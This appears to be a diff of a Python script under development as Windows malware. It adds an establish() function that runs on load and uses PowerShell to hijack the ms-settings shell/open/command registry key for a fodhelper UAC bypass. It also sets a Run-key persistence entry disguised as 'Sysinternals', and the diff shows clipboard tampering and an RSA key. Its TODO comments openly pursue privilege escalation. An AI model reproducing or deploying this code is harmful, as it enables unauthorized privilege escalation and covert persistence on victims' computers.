@@ -27,29 +27,33 @@ public = rsa.PublicKey(
         65537)
 
 def main():
+    current: str = os.path.abspath(__file__)
     #if not pyuac.isUserAdmin():
     # If not running as admin, set reg keys to execute the script with bypassing User Account Control (UAC)
     my_env = os.environ.copy()
     my_env['COMSPEC'] = r'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe'
 
-    cmd = ["New-Item", "-Path", "HKCU:\\SOFTWARE\\Classes\\ms-settings\\shell\\open\\command", "-Force | Out-Null"]
-    result = subprocess.run(cmd, shell=True, capture_output=True, text=True, env = my_env)
-    print(result)
+    #cmd5 = ["reg", "add", "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe", "/v", "Sysinternals", "/t","REG_SZ", "/d", current]
+    #result = subprocess.run(cmd5, shell=True, capture_output=True, text=True, env = my_env)
+    #print(result)
+
+    #cmd = ["", "-Path", "HKCU:\\SOFTWARE\\Classes\\ms-settings\\shell\\open\\command", "-Force | Out-Null"]
+
+    #cmd = ["New-Item", "-Path", "HKCU:\\SOFTWARE\\Classes\\ms-settings\\shell\\open\\command", "-Force | Out-Null"]
+    #result = subprocess.run(cmd, shell=True, capture_output=True, text=True, env = my_env)
+    #print(result)
     #using exe path...
-    cmd2 = ["Set-ItemProperty", "-Path", "HKCU:\\SOFTWARE\\Classes\\ms-settings\\shell\\open\\command", "-Name", "(Default)", "-Value",
-                "$MyInvocation.MyCommand.Path", "-Force" ]
-    result = subprocess.run(cmd2, shell=True, capture_output=True, text=True, env = my_env)
-    print(result)
+    #cmd2 = ["Set-ItemProperty", "-Path", "HKCU:\\SOFTWARE\\Classes\\ms-settings\\shell\\open\\command", "-Name", "(Default)", "-Value","$MyInvocation.MyCommand.Path", "-Force" ]
+    #result = subprocess.run(cmd2, shell=True, capture_output=True, text=True, env = my_env)
+    #print(result)
 
-    cmd3 = ["New-ItemProperty", "-Path", "HKCU:\\SOFTWARE\\Classes\\ms-settings\\shell\\open\\command", "-Name",
-                "DelegateExecute", "-PropertyType",
-                "String", "-Force | Out-Null"]
-    result = subprocess.run(cmd3, shell=True, capture_output=True, text=True, env = my_env)
-    print(result)
+    #cmd3 = ["New-ItemProperty", "-Path", "HKCU:\\SOFTWARE\\Classes\\ms-settings\\shell\\open\\command", "-Name","DelegateExecute", "-PropertyType","String", "-Force | Out-Null"]
+    #result = subprocess.run(cmd3, shell=True, capture_output=True, text=True, env = my_env)
+    #print(result)
 
-    cmd4 = ["Start-Process", "fodhelper.exe", "-WindowStyle", "Hidden"]
-    result = subprocess.run(cmd4, shell=True, capture_output=True, text=True, env = my_env)
-    print(result)
+    #cmd4 = ["Start-Process", "fodhelper.exe", "-WindowStyle", "Hidden"]
+    #result = subprocess.run(cmd4, shell=True, capture_output=True, text=True, env = my_env)
+    #print(result)
 
     #New-Item -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" -Force | Out-Null
     #Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" -Name "(Default)" -Value $value -Force
@@ -81,11 +85,13 @@ def main():
 
     #"/v KeyTest", "/t REG_SZ", "/d 10"
 
-    current:str = os.path.abspath(__file__)
+
     #TODO: PRIVILEGE ESCALATION OR THIS WON'T WORK
     #TODO: I have thi sin a run key that is created, need it to actually get the correct file path and run the script
     #TODO: research why script is not running how it should...
-    cmd5 = ["reg", "add", "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "/v", "Sysinternals", "/t", "REG_SZ", "/d", current]
+    #TODO: try HKCU
+    #TOOD: add to startup folders...
+    cmd5 = ["reg", "add", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "/v", "Sysinternals", "/t", "REG_SZ", "/d", current]
     #TODO: https://stackoverflow.com/questions/19672352/how-to-run-script-with-elevated-privilege-on-windows, use this to run as admin
     #reg add HKLM\Software\MyCo TODO: this works but only in admin mode so need to enable admin running!!!
     #os.system(cmd)
@@ -237,5 +243,40 @@ def change_password() -> None:
     #in this case copies the current clipboard info plus an invisible character
     pyperclip.copy('password')
 
+def establish():
+
+    #cmd = ["reg", "add", "HKCU:\\SOFTWARE\\Classes\\ms-settings\\shell\\open\\command",
+    #        "/v", "Sysinternals", "/t","REG_SZ", "/d", "C:\\Windows\\System32\\fodhelper.exe"]
+
+    #cmd2 = ["reg", "add", "HKCU:\\SOFTWARE\\Classes\\ms-settings\\shell\\open\\command",
+    #        "/v", "DelegateExecute", "/t","REG_SZ", "/d", ""]
+    #cmd3 = ["reg", "add", "HKCU:\\SOFTWARE\\Classes\\ms-settings\\shell\\open\\command",
+    #        "/v", "(default)", "/t","REG_SZ", "/d", "C:\\Windows\\System32\\clipboard_copy_test.exe"]
+
+    cmd = ["powershell", "-Command", "New-Item", "-Path", "HKCU:\\SOFTWARE\\Classes\\ms-settings\\shell\\open\\command", "-Force"]
+
+    cmd2 = ["powershell", "-Command", "New-ItemProperty", "-Path", "HKCU:\\SOFTWARE\\Classes\\ms-settings\\shell\\open\\command", "-Name",
+            "DelegateExecute", "-Value", "?", "-Force"]
+
+    cmd3 = ["powershell", "-Command", "Set-Item", "-Path", "HKCU:\\SOFTWARE\\Classes\\ms-settings\\shell\\open\\command",
+            "-Value", "C:\\Windows\\System32\\clipboard_copy_test.exe", "-Force"]
+
+
+    #result1 = subprocess.run(cmd, shell=True, capture_output=True, text=True, env = my_env)
+    result1 = subprocess.run(cmd, capture_output=True)
+    result2 = subprocess.run(cmd2, capture_output=True)
+    result3 = subprocess.run(cmd3, capture_output=True)
+
+    #result3 = subprocess.run(cmd3, shell=True, capture_output=True, text=True, env=my_env)
+
+    print(result1)
+    print(result2)
+    print(result3)
+
+    #cmd4 = ["Start-Process", "fodhelper.exe", "-WindowStyle", "Hidden"]
+    #result = subprocess.run(cmd4, shell=True, capture_output=True, text=True, env = my_env)
+    #print(result)
+
+establish()
 #calls main
 main()
